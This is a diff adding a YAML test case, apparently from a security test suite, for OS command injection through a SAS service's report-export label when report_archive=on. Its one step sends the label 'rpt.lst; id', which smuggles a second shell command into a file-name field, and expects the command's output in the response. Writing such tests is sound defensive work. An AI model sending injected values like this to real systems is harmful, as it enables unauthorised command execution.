@@ -1,0 +1,11 @@
+# LG-CMDI-001 — OS command injection via the SAS report-export label. Exploitable when report_archive=on.
+preconditions:
+  - "config report_archive=on"
+steps:
+  - call: "POST /export (SAS service)"
+    body: { export_label: "rpt.lst; id" }
+    expect: "the injected `id` runs; its output (uid=...) appears in the export log"
+observable: >
+  The response `output` contains the stdout of the injected command (e.g. "uid=..."), proving the
+  export label was executed by the shell (%SYSEXEC). With report_archive=off the label is not
+  passed to any shell and the response reports the export as disabled/inert.
